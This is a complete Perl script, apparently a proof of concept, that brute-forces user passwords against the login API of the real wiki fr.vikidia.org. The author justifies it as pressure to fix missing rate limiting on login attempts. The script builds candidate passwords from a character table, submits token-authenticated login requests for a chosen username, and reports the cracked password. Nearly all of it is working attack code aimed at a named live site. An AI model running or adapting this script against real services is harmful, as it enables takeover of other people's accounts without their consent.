#! /usr/bin/perl -w

# ----------------------------------------------------.
#  * hyperforce.pl                                    !
# This script is a proof-of-concept about how easy    !
#   identity stealing can be on http://*.vikidia.org. !
# Therefore, it is not designed to break into an      !
#   account... but might be used to do it.            !
# I hope this script will, well... encourage to fix   !
#   it as fast as possible!                           !
# Designed by thilp under the DO WHAT THE FUCK YOU    !
#   WANT TO PUBLIC LICENSE, version 2                 !
#   (http://sam.zoy.org/wtfpl/).                      !
# ----------------------------------------------------'

use strict;
use LWP::UserAgent;
use HTTP::Cookies;

print "\n    *** Welcome to hyperforce! ***\n\n";
print "  This little script tries to guess your target's password on Vikidia.\n";
print "  It is able to do it because of a *major security breach* in the\n";
print "  MediaWiki's authentication process which allows a new login request\n";
print "  immediatly after an erroneous one.\n\n";
print "  You will be notified each 100 requests (because displaying each\n";
print "  password slows the bruteforce). This allows you to relaunch the\n";
print "  attack from a given password instead of from the beginning.\n";
print "  Just modify in the code the first value of the \@struct variable.\n\n";
print "  I made this program to accelerate the fixing procedure which was a\n";
print "  little slow ;)\n\n";

# GLOBAL
  my $ua = LWP::UserAgent->new(
    agent => 'Hyperion/5.0.perl (thilp/bot/lol)',
    cookie_jar => HTTP::Cookies->new(
      file => 'cookies.txt',
      autosave => 1,
      ignore_discard => 1
    )
  );
  $ua->timeout(10);
  $ua->from('thilp.is@gmail.com');
# END GLOBAL

sub requeteAPI
{
  my @params = split(/#&/, $_[0]);
  my %params = ('format' => 'xml');

  foreach my $champ (@params)
  {
    my ($attr,$val) = split(/#=/, $champ);
    $params{$attr} = $val;
  }
  my $rep = $ua->post(
    'http://fr.vikidia.org/w/api.php',
    Content_Type => 'application/x-www-form-urlencoded',
    Content => \%params
   );
  return $rep->status_line unless $rep->is_success;
  return $rep->content;
}

sub connexion
{
  my ($pseudo,$mdp,$ref_result) = @_;
  my ($result,$jeton) = (requeteAPI('action#=login#&lgname#='.$pseudo) =~
    /\bresult="([^"]+)"(?: token="([0-9a-f]{32})")?/);

  if (!$jeton)
  {
    $$ref_result = $result;
    return 0;
  }
  ($result) = (requeteAPI('action#=login#&lgname#='.$pseudo.'#&lgpassword#='.
    $mdp.'#&lgtoken#='.$jeton) =~ /\bresult="([^"]+)"/);
  $$ref_result = $result;

  return $result eq 'Success';
}

# PASSWORD GENERATION

# @struct describes the password structure
my @struct = (0,2,15,45,0);
# @table contains all the strings that can be assembled to generate $pwd
my @table = (
  # WORDS
#  'bonjour','salut','pass','motdepasse','azerty', 'vikidia',
#  'viki','wiki','lol',
  # LETTERS
  'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q',
  'r','s','t','u','v','w','x','y','z',
  # NUMBERS
  '0','1','2','3','4','5','6','7','8','9',
#  '10','11','12','13','14','15','16','17','18','19',
#  '20','21','22','23','24','25','26','27','28','29',
#  '30','31','32','33','34','35','36','37','38','39',
#  '40','41','42','43','44','45','46','47','48','49',
#  '50','51','52','53','54','55','56','57','58','59',
#  '60','61','62','63','64','65','66','67','68','69',
#  '70','71','72','73','74','75','76','77','78','79',
#  '80','81','82','83','84','85','86','87','88','89',
#  '90','91','92','93','94','95','96','97','98','99',
  # SYMBOLS
  '!','-','+',
  # SERIES
  '123456789','123456','6789','9876','987654321','02357',
  '2468','1357'
);

# Generation function: takes the \@struct, changes it and
#   gives the new $pwd, created according to the @struct.
sub generate_pwd
{
  my ($ref_struct, $rank) = @_;
  $rank = 1 if (!defined($rank));
  my $ret = '';

  if (scalar(@table) == $$ref_struct[-$rank])
  {
    $$ref_struct[-$rank] = 0;
    if ($rank == scalar(@$ref_struct))
    {
      $$ref_struct[scalar(@$ref_struct)] = 0;
      return generate_pwd ($ref_struct);
    }
    else
    {
      $$ref_struct[-$rank - 1]++;
      return generate_pwd ($ref_struct,$rank + 1);
    }
  }
  else
  {
    foreach (@$ref_struct)
    {
      $ret .= $table[$_];
    }
    $$ref_struct[-1]++;
    return $ret;
  }
}

# User interaction and main script

my $result;
my $ret = 0;
my $count = 0;
my $pass;

if (@ARGV == 1)
{
  while ($ret == 0)
  {
    $pass = generate_pwd(\@struct);
    print("Trying with ".$pass."...\n") if ($count % 100 == 0);
    $ret = connexion($ARGV[0], $pass, \$result);
    $count++;
  }
  print "PASSWORD FOUND! >> ".$pass."\n";
}
else
{
  print "Usage: ./hyperforce.pl USERNAME\n";
  exit 1;
}
